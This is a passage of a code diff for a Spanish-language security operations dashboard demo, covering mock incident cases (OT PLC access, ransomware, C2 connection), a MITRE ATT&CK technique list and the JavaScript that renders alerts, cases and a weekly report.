+   summary:"Se registró un acceso al PLC de una línea de producción fuera de la ventana operativa. Podría ser una credencial comprometida o un mantenimiento no comunicado. Al tratarse de un activo OT, el sistema NO aísla automáticamente —aislar un PLC pararía la producción— y escala al responsable para validación humana. Es el checkpoint OT que un SOC genérico ignora.",
+   ia:"Anomalía temporal en activo OT. Requiere validación humana.",misp:"Sin coincidencias — origen interno.",
+   timeline:[["Identificación","22:41","","Acceso al PLC fuera de la ventana operativa."],["Investigación","22:43","","ARGOS lo marca como OT crítico y NO auto-aisla (salvaguarda)."],["Respuesta","22:50","","El responsable valida desde el móvil y contacta con planta."],["Cierre","23:05","","Mantenimiento legítimo no comunicado. Documentado como benigno."]],
+   response:[["warn","Aislamiento retenido (activo OT) — requiere confirmación","22:43"],["check","Alerta prioritaria al responsable IT/OT","22:43"]],
+   reco:["Implantar procedimiento de comunicación de mantenimientos OT.","Revisar y rotar credenciales de acceso a los PLC.","Definir ventana horaria y alertar por defecto fuera de ella."]},
+  {id:5,sev:"critica",ot:false,title:"Comportamiento tipo ransomware en endpoint",mitre:[["T1486","Cifrado de datos"],["T1059","Scripting"]],asset:"pc-conta-04",ip:"10.10.2.44",src:"Endpoint interno",when:"Hoy · 11:02",status:"Contenido",stcls:"st-cont",verdict:"tp",
+   summary:"El monitor de integridad de ficheros detectó un cifrado masivo y anómalo de archivos en un endpoint de contabilidad, patrón típico de ransomware. El sistema aisló el equipo de la red de forma automática en segundos, deteniendo la propagación. La IA lo clasificó como crítico y el hash del proceso coincidía con malware conocido.",
+   ia:"Cifrado en curso. Malware con confianza alta. Severidad crítica.",misp:"Hash del proceso en base de datos de amenazas.",
+   timeline:[["Identificación","11:02:10","crit","FIM + reglas detectan cifrado anómalo de ficheros."],["Contención","11:02:12","cont","Respuesta Activa aísla el host de la red."],["Erradicación","11:20","","El analista termina el proceso y limpia el equipo."],["Recuperación","12:40","","Restauración de archivos desde copia de seguridad."],["Cierre","13:10","","Incidente documentado; lecciones aprendidas."]],
+   response:[["lock","Host aislado de la red","11:02"],["check","Proceso malicioso terminado","11:20"],["check","Snapshot forense preservado","11:05"]],
+   reco:["Investigar el vector de entrada (probable phishing).","Verificar y probar la restauración de copias de seguridad.","Formación antiphishing al personal de administración."]},
+  {id:3,sev:"alta",ot:false,title:"Conexión saliente a IP en lista negra",mitre:[["T1071","C2 / capa de aplicación"]],asset:"srv-web-01",ip:"23.129.64.8",src:"Salida a Internet",when:"Hoy · 09:48",status:"Contenido",stcls:"st-cont",verdict:"tp",
+   summary:"Un servidor web estableció una conexión saliente hacia una IP catalogada como maliciosa (posible baliza de mando y control). ARGOS correlacionó el evento con la inteligencia de amenazas y bloqueó la conexión saliente, abriendo caso para investigar si el servidor está comprometido.",
+   ia:"Posible canal C2. Requiere revisión del servidor.",misp:"IP destino en feed de amenazas (C2 / salida Tor).",
+   timeline:[["Identificación","09:48","","Conexión saliente hacia IP maliciosa conocida."],["Contención","09:48","cont","Bloqueo automático de la conexión saliente."],["Investigación","10:05","","Búsqueda de persistencia y procesos sospechosos."],["Cierre","11:30","","Servicio afectado identificado y saneado."]],
+   response:[["lock","Conexión saliente bloqueada","09:48"],["check","Caso abierto para investigación","09:48"]],
+   reco:["Auditar el servidor web en busca de webshell o backdoor.","Revisar parches y componentes expuestos.","Añadir la IP a la lista de bloqueo permanente."]}
+];
+
+var DEMO_MITRE=[
+  ["T1110","Fuerza bruta","hot"],["T1078","Cuentas válidas","on"],["T1046","Escaneo de red","on"],
+  ["T1071","C2","on"],["T1486","Cifrado (ransomware)","hot"],["T1059","Scripting","on"],
+  ["T1021","Servicios remotos",""],["T1068","Escalada",""],["T1562","Evasión",""],["T1200","Acceso físico",""]
+];
+
+/* ------------------------------------------------------------------
+   UTILIDADES Y ESTADO
+   ------------------------------------------------------------------ */
+var ALERTS=[], LVL='all', SUM={total:1174,critica:168,alta:322,media:374,baja:310,ot:56,contenidas:411,casos:9};
+
+function $(id){return document.getElementById(id);}
+function esc(s){ if(s==null) return ''; return String(s).replace(/[&<>"']/g,function(c){return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];}); }
+function pad(x){return String(x).padStart(2,'0');}
+function fmtTime(ts){ if(!ts) return ''; var d=new Date(ts); if(isNaN(d)) return ts; return pad(d.getDate())+'/'+pad(d.getMonth()+1)+' '+pad(d.getHours())+':'+pad(d.getMinutes()); }
+function rand(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+
+function setClock(){
+  var d=new Date();
+  $('clock').textContent=pad(d.getHours())+':'+pad(d.getMinutes())+':'+pad(d.getSeconds());
+}
+
+function toggleDemo(){
+  var demo=$('mode-pill').classList.toggle('demo');
+  $('btn-demo').innerHTML=demo?'DEMO: ON':'DEMO: OFF';
+  $('mode-txt').textContent=demo?'MODO DEMO':'EN VIVO';
+  $('demo-note').style.display=demo?'block':'none';
+  refresh();
+}
+
+/* ------------------------------------------------------------------
+   GENERADOR DE ALERTAS DEMO (mismo estilo vitrina que ARGOS)
+   ------------------------------------------------------------------ */
+function demoAlerts(size){
+  var n=Math.min(size||40,60), out=[], now=Date.now();
+  for(var i=0;i<n;i++){
+    var t=DEMO_POOL[Math.floor(Math.random()*DEMO_POOL.length)];
+    var ts=now-Math.floor(Math.random()*86000)*1000;
+    out.push({
+      ruleId:t.rule,ruleLevel:t.level,ruleDescription:t.desc,
+      mitreIds:t.mitre.slice(),severidad:t.sev,agentName:t.agent,decoder:"demo-decoder",
+      location:t.loc,fullLog:t.log,
+      srcIp:t.ot?t.ip:(t.ip.slice(0,t.ip.lastIndexOf('.'))+'.'+rand(2,250)),
+      isOt:t.ot,otAsset:t.ot?t.asset:null,otIp:t.ot?t.ip:null,timestamp:ts,
+      data:{srcip:t.ip,integration:t.ot?"argos-ot":"argos-it"}
+    });
+  }
+  out.sort(function(a,b){return b.timestamp-a.timestamp;});
+  return out;
+}
+
+/* ------------------------------------------------------------------
+   RENDER
+   ------------------------------------------------------------------ */
+function renderFilters(s){
+  var items=[['all','Todas',s.total],['critica','Críticas',s.critica],['alta','Altas',s.alta],['media','Medias',s.media],['baja','Bajas',s.baja]];
+  $('filters').innerHTML='';
+  items.forEach(function(x){
+    var b=document.createElement('button');
+    b.className='f'+(x[0]==='all'?'':' '+x[0])+(x[0]===LVL?' on':'');
+    b.textContent=x[1]+' · '+x[2];
+    b.onclick=function(){LVL=x[0];refresh();};
+    $('filters').appendChild(b);
+  });
+}
+
+function renderFeed(list){
+  var feed=$('feed'); feed.innerHTML='';
+  if(!list.length){ feed.innerHTML='<div class="hint">Sin alertas en la ventana. Todo tranquilo.</div>'; return; }
+  list.forEach(function(a){
+    var s=SEV[a.severidad]||{n:a.severidad,c:'low'};
+    var el=document.createElement('div');
+    el.className='alert '+s.c;
+    el.onclick=function(){openAlert(a);};
+    var ot=a.isOt?' · <span class="ot">OT</span>':'';
+    var mit=(a.mitreIds||[]).length?'<span class="mitre">'+esc(a.mitreIds.join(', '))+'</span>':'';
+    el.innerHTML='<span class="sev '+s.c+'"></span>'+
+      '<div style="min-width:0"><div class="title">'+esc(a.ruleDescription)+'</div>'+
+      '<div class="meta">'+mit+' '+esc(a.ruleId||'')+' · '+esc(a.agentName||'?')+(a.srcIp?' · '+esc(a.srcIp):'')+ot+'</div></div>'+
+      '<div class="status">'+s.n+'<small>'+fmtTime(a.timestamp)+'</small></div>';
+    feed.appendChild(el);
+  });
+}
+
+function renderDonut(s){
+  var C=100, segs=[['var(--red)',s.critica],['var(--orange)',s.alta],['var(--amber)',s.media],['var(--green)',s.baja]];
+  var tot=(s.critica||0)+(s.alta||0)+(s.media||0)+(s.baja||0)||1;
+  var cum=0, arcs='';
+  segs.forEach(function(x){
+    var c=x[0], v=x[1];
+    if(v<=0) return;
+    var len=v/tot*C;
+    arcs+='<circle cx="21" cy="21" r="15.9" fill="none" stroke="'+c+'" stroke-width="7" stroke-dasharray="'+len.toFixed(2)+' '+(C-len).toFixed(2)+'" stroke-dashoffset="'+(C-cum).toFixed(2)+'"></circle>';
+    cum+=len;
+  });
+  $('donut-arcs').innerHTML=arcs;
+  $('donut-total').textContent=tot;
+  $('legend').innerHTML=segs.map(function(x,i){
+    var c=x[0], v=x[1];
+    return '<div><span class="sw" style="background:'+c+'"></span><span>'+['Crítica','Alta','Media','Baja'][i]+'</span><b>'+Math.round(v/tot*100)+'%</b></div>';
+  }).join('');
+}
+
+function renderRespMini(items){
+  var box=$('resp-mini');
+  box.innerHTML='';
+  if(!items.length){ box.innerHTML='<div class="hint">—</div>'; return; }
+  items.slice(0,4).forEach(function(it){
+    var d=document.createElement('div'); d.className='r'; d.style.cursor='pointer';
+    d.onclick=function(){openCase(it['case']);};
+    d.innerHTML='<div class="ic '+(it.ic==='warn'?'warn':'')+'">'+ICONS[it.ic]+'</div><div style="font-weight:600">'+esc(it.t)+'</div><div class="when">#'+it['case']+'</div>';
+    box.appendChild(d);
+  });
+}
+
+function refresh(){
+  ALERTS=demoAlerts(40);
+  var filtered=LVL==='all'?ALERTS:ALERTS.filter(function(a){return a.severidad===LVL;});
+  renderFilters(SUM);
+  $('kpi-alerts').textContent=SUM.total;
+  $('kpi-cont').textContent=SUM.contenidas;
+  $('kpi-casos').textContent=SUM.casos;
+  $('kpi-ot').textContent=SUM.ot;
+  renderDonut(SUM);
+  renderFeed(filtered);
+  setClock();
+}
+
+function openAlert(a){
+  var mit=(a.mitreIds||[]).map(function(m){return '<span class="pill teal">'+esc(m)+'</span>';}).join(' ');
+  var ot=a.isOt?'<span class="pill ot">OT</span>':'';
+  var s=SEV[a.severidad]||{n:a.severidad};
+  $('d-body').innerHTML=
+    '<div style="font-size:11px;color:var(--muted);letter-spacing:.5px">'+esc(a.ruleId||'')+' · '+esc(a.agentName||'')+' · '+fmtTime(a.timestamp)+'</div>'+
+    '<h3>'+esc(a.ruleDescription)+'</h3>'+
+    '<div class="chips">'+mit+' '+ot+'</div>'+
+    '<div class="kv2">'+
+      '<div class="e"><div class="lab">Severidad</div><b>'+s.n+' (nivel '+esc(a.ruleLevel)+')</b></div>'+
+      '<div class="e"><div class="lab">Agente</div><b>'+esc(a.agentName||'—')+'</b></div>'+
+      (a.srcIp?'<div class="e"><div class="lab">IP origen</div><b>'+esc(a.srcIp)+'</b></div>':'')+
+      (a.otAsset?'<div class="e"><div class="lab">Activo OT</div><b>'+esc(a.otAsset)+'</b></div>':'')+
+      (a.location?'<div class="e"><div class="lab">Ubicación</div><b>'+esc(a.location)+'</b></div>':'')+
+      (a.decoder?'<div class="e"><div class="lab">Decoder</div><b>'+esc(a.decoder)+'</b></div>':'')+
+    '</div>'+
+    (a.fullLog?'<div class="pre-t">Log original</div><pre>'+esc(a.fullLog)+'</pre>':'')+
+    '<div class="pre-t">Datos crudos</div><pre>'+esc(JSON.stringify(a.data||{},null,2))+'</pre>';
+  $('ov-detail').classList.add('on');
+}
+function closeDetail(){ $('ov-detail').classList.remove('on'); }
+
+/* ------------------------------------------------------------------
+   NAVEGACIÓN ENTRE VISTAS
+   ------------------------------------------------------------------ */
+var VIEWS=['dashboard','cases','response','mitre','reportes'];
+var CRUMBS={dashboard:'Panel de control',cases:'Casos de incidente',response:'Respuesta activa',mitre:'MITRE ATT&CK',reportes:'Informe semanal'};
+var CASE_OPENED=null;
+
+function go(v){
+  if(v==='case'){ renderCaseDetail(CASE_OPENED); return; }
+  VIEWS.forEach(function(x){
+    $('view-'+x).classList.toggle('on',x===v);
+    var nav=$('nav-'+x); if(nav) nav.classList.toggle('active',x===v);
+  });
+  var cr=$('crumb'); cr.innerHTML='<b>'+CRUMBS[v]+'</b>';
+  if(v==='cases') renderCases();
+  if(v==='response') renderRespFull();
+  if(v==='mitre') renderMitre();
+  if(v==='reportes') renderReportes();
+}
+
+/* ------------------------------------------------------------------
+   CASOS
+   ------------------------------------------------------------------ */
+function sevPill(s){
+  var m={'critica':'crit','alta':'high','media':'med','baja':'low'};
+  return '<span class="pill '+(m[s]||'')+'">'+esc(s||'')+'</span>';
+}
+function sevName(s){ var m={critica:'Crítica',alta:'Alta',media:'Media',baja:'Baja'}; return m[s]||s; }
+function verdictName(v){ return v==='tp'?'Verdadero positivo':(v==='bn'?'Benigno':''); }
+
+function renderCases(){
+  var body=$('cases-body'); body.innerHTML='';
+  $('cases-tag').textContent=DEMO_CASES.length+' abiertos';
+  DEMO_CASES.forEach(function(c){
+    var mit=(c.mitre||[]).map(function(m){return '<span class="pill teal">'+esc(m[0])+'</span>';}).join(' ');
+    var tr=document.createElement('tr');
+    tr.innerHTML='<td><b>#'+c.id+'</b></td>'+
+      '<td>'+esc(c.title)+(c.ot?' <span class="pill ot">OT</span>':'')+'</td>'+
+      '<td>'+mit+'</td>'+
+      '<td>'+sevPill(c.sev)+'</td>'+
+      '<td>'+esc(c.asset)+'</td>'+
+      '<td><span class="badge-st '+c.stcls+'">'+esc(c.status)+'</span></td>'+
+      '<td><span style="color:var(--muted)">›</span></td>';
+    tr.onclick=function(){openCase(c.id);};
+    body.appendChild(tr);
+  });
+}
+
+function openCase(id){
+  CASE_OPENED=DEMO_CASES.filter(function(c){return c.id===id;})[0];
+  go('case');
+}
+
+function renderCaseDetail(c){
+  if(!c) return;
+  var cr=$('crumb');
+  cr.innerHTML='<b onclick="go(\'cases\')" style="cursor:pointer">Casos</b> <span style="color:#26343f">/</span> <b>#'+c.id+'</b>';
+  VIEWS.forEach(function(x){ var el=$('view-'+x); if(el) el.classList.remove('on'); });
+  $('view-case').classList.add('on');
+  var tl=(c.timeline||[]).map(function(e){
+    return '<div class="ev '+(e[2]||'')+'"><div class="ph">'+esc(e[0])+'</div><div class="tt">'+esc(e[3])+'</div><div class="tm">'+esc(e[1])+'</div></div>';
+  }).join('');
+  var resp=(c.response||[]).map(function(r){
+    return '<div class="r"><div class="ic '+(r[0]==='warn'?'warn':'')+'">'+ICONS[r[0]]+'</div><div style="font-weight:600">'+esc(r[1])+'</div><div class="when">'+esc(r[2])+'</div></div>';
+  }).join('');
+  var reco=(c.reco||[]).map(function(r){return '<li>'+esc(r)+'</li>';}).join('');
+  var mit=(c.mitre||[]).map(function(m){return '<span class="pill teal">'+esc(m[0])+' · '+esc(m[1])+'</span>';}).join(' ');
+  var ot=c.ot?'<span class="pill ot">OT</span>':'';
+  $('view-case').innerHTML=
+    '<a class="backlink" onclick="go(\'cases\')"><i class="fa-solid fa-arrow-left"></i> Volver a casos</a>'+
+    '<div class="case-head">'+
+      '<div><h3>'+esc(c.title)+'</h3><div class="chips">'+mit+' '+ot+'</div></div>'+
+      '<div class="kv"><b>#'+c.id+'</b><br>'+sevName(c.sev)+'<br><span class="badge-st '+c.stcls+'">'+esc(c.status)+'</span><br><span class="verdict '+c.verdict+'">'+verdictName(c.verdict)+'</span></div>'+
+    '</div>'+
+    '<div class="rep-grid">'+
+      '<div>'+
+        '<div class="section-t">Qué ha pasado</div><p class="body">'+esc(c.summary)+'</p>'+
+        '<div class="section-t">Línea de tiempo (PICERL)</div><div class="tl">'+tl+'</div>'+
+        '<div class="section-t">Recomendaciones</div><ul class="reco">'+reco+'</ul>'+
+      '</div>'+
+      '<div>'+
+        '<div class="section-t">Enriquecimiento</div><div class="enrich">'+
+          '<div class="e"><span class="lab">IA · ARGOS</span><span>'+esc(c.ia)+'</span></div>'+
+          '<div class="e"><span class="lab">MISP</span><span>'+esc(c.misp)+'</span></div>'+
+        '</div>'+
+        '<div class="section-t">Respuesta ejecutada</div><div class="resp-list">'+resp+'</div>'+
+      '</div>'+
+    '</div>';
+}
+
+/* ------------------------------------------------------------------
+   RESPUESTA ACTIVA
+   ------------------------------------------------------------------ */
+function demoResponseItems(){
+  var items=[];
+  DEMO_CASES.forEach(function(c){
+    c.response.forEach(function(r){ items.push({ic:r[0],t:r[1],w:r[2],'case':c.id,title:c.title}); });
+  });
+  return items;
+}
+
+function renderRespFull(){
+  var box=$('resp-full'); box.innerHTML='';
+  demoResponseItems().forEach(function(it){
+    var d=document.createElement('div'); d.className='r';
+    d.innerHTML='<div class="ic '+(it.ic==='warn'?'warn':'')+'">'+ICONS[it.ic]+'</div>'+
+      '<div style="min-width:0"><div style="font-weight:600">'+esc(it.t)+'</div><div style="font-size:11px;color:var(--muted)">'+esc(it.title)+'</div></div>'+
+      '<div class="when">#'+it['case']+'</div>';
+    box.appendChild(d);
+  });
+}
+
+/* ------------------------------------------------------------------
+   MITRE
+   ------------------------------------------------------------------ */
+function renderMitre(){
+  $('mitre-box').innerHTML=DEMO_MITRE.map(function(t){
+    return '<span class="tech '+(t[2]||'')+'"><b>'+esc(t[0])+'</b> · '+esc(t[1])+'</span>';
+  }).join('');
+}
+
+/* ------------------------------------------------------------------
+   REPORTES
+   ------------------------------------------------------------------ */
+function avanceCaso(c){
+  var ok=0;
+  TL_FASES.forEach(function(f){
+    (c.timeline||[]).forEach(function(e){ if(e[0]===f && e[3]) ok++; });
+  });
+  return Math.round(ok*100/TL_FASES.length);
+}
+
+function renderReportes(){
+  var box=$('rep-list'); box.innerHTML='';
+  $('rep-tag').textContent=DEMO_CASES.length;
+  DEMO_CASES.forEach(function(c){
+    var prog=avanceCaso(c);
+    var d=document.createElement('div'); d.className='rep-card';
+    d.innerHTML='<div class="top">'+
+      '<b>#'+c.id+'</b><b style="color:var(--text)">'+esc(c.title)+'</b>'+
+      sevPill(c.sev)+
+      '<span class="pill teal">'+verdictName(c.verdict)+'</span>'+
+      '<span class="badge-st '+c.stcls+'">'+esc(c.status)+'</span>'+
+      '<span style="font-size:11px;color:var(--muted)">'+prog+'% PICERL</span>'+
+      '<span class="pbar2"><i style="width:'+prog+'%"></i></span>'+
+      '</div>'+
+      '<div class="meta">'+
+        '<span>Activo: '+esc(c.asset||'—')+'</span>'+
+        '<span>IP: '+esc(c.ip||'—')+'</span>'+
+        '<span>Origen: '+esc(c.src||'—')+'</span>'+
+        '<span>Detectado: '+esc(c.when||'—')+'</span>'+
+      '</div>';
+    box.appendChild(d);
+  });
+}
+
+function genReport(){
+  var today=new Date();
+  var st=SUM;
+  var casesHtml=DEMO_CASES.map(function(c){
+    var tl=(c.timeline||[]).map(function(e){return '<tr><td style="padding:4px 8px;color:#8b99a7">'+esc(e[0])+' · '+esc(e[1])+'</td><td style="padding:4px 8px">'+esc(e[3])+'</td></tr>';}).join('');
+    var rec=(c.reco||[]).map(function(r){return '<li>'+esc(r)+'</li>';}).join('');
+    var res=(c.response||[]).map(function(r){return '<li>'+esc(r[1])+'</li>';}).join('');
+    return '<div style="border:1px solid #20303c;border-radius:10px;padding:14px;margin:14px 0">'+
+      '<div style="font-size:16px;font-weight:700">#'+c.id+' · '+esc(c.title)+'</div>'+
+      '<div style="font-size:12px;color:#8b99a7;margin:4px 0">'+sevName(c.sev)+' · '+verdictName(c.verdict)+' · '+esc(c.status)+' · Activo: '+esc(c.asset)+' · IP: '+esc(c.ip)+'</div>'+
+      '<p style="font-size:13px;line-height:1.6">'+esc(c.summary)+'</p>'+
+      '<div style="font-size:11px;color:#2dd4bf;margin-top:8px"><b>Enriquecimiento</b></div>'+
+      '<p style="font-size:12px;margin:4px 0">IA · ARGOS: '+esc(c.ia)+'<br>MISP: '+esc(c.misp)+'</p>'+
+      '<div style="font-size:11px;color:#2dd4bf;margin-top:8px"><b>Línea de tiempo (PICERL)</b></div>'+
+      '<table style="width:100%;border-collapse:collapse;font-size:12px">'+tl+'</table>'+
+      '<div style="font-size:11px;color:#2dd4bf;margin-top:8px"><b>Respuesta ejecutada</b></div><ul style="font-size:12px;margin:4px 0">'+res+'</ul>'+
+      '<div style="font-size:11px;color:#2dd4bf;margin-top:8px"><b>Recomendaciones</b></div><ul style="font-size:12px;margin:4px 0">'+rec+'</ul>'+
+    '</div>';
+  }).join('');
+  var html='<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Informe semanal · SOC Adeodato</title></head>'+
+    '<body style="background:#0b0f14;color:#e6edf3;font-family:Segoe UI,Arial,sans-serif;margin:0;padding:24px">'+
+    '<div style="max-width:820px;margin:0 auto">'+
+    '<div style="border-bottom:2px solid #2dd4bf;padding-bottom:12px">'+
+    '<div style="font-size:22px;font-weight:700;color:#2dd4bf">SOC Adeodato</div>'+
+    '<div style="font-size:13px;color:#8b99a7">Informe semanal de seguridad · ARGOS + AdeoSOC · IT/OT</div>'+
+    '<div style="font-size:12px;color:#8b99a7">Periodo: última semana · Generado: '+today.toLocaleDateString('es-ES')+' '+pad(today.getHours())+':'+pad(today.getMinutes())+'</div>'+
+    '</div>'+
+    '<h2 style="margin:18px 0 8px;font-size:16px">Resumen ejecutivo</h2>'+
+    '<p style="font-size:13px;line-height:1.6">Durante la última semana el vSOC procesó <b>'+st.total+'</b> alertas, de las cuales <b>'+st.critica+'</b> críticas, <b>'+st.alta+'</b> altas, <b>'+st.media+'</b> medias y <b>'+st.baja+'</b> bajas. Se contuvieron <b>'+st.contenidas+'</b> amenazas mediante respuesta automática y <b>'+st.ot+'</b> alertas correspondieron a activos OT. Hay <b>'+st.casos+'</b> casos abiertos en gestión (IRIS).</p>'+
+    '<h2 style="margin:18px 0 8px;font-size:16px">Casos documentados</h2>'+casesHtml+
+    '<div style="border-top:1px solid #20303c;margin-top:22px;padding-top:10px;font-size:11px;color:#8b99a7">SOC Adeodato · Detección continua · contención automática · IT y OT · Operado en red privada sin exposición a Internet · Ctrl+P para guardar como PDF.</div>'+
+    '</div></body></html>';
+  var w=window.open('','_blank');
+  if(w){ w.document.write(html); w.document.close(); }
+}
+
+/* ------------------------------------------------------------------
+   INICIO
+   ------------------------------------------------------------------ */
+setInterval(setClock,1000);
+setInterval(refresh,30000);
+refresh();
+renderRespMini(demoResponseItems());
+</script>
+</body>
+</html>
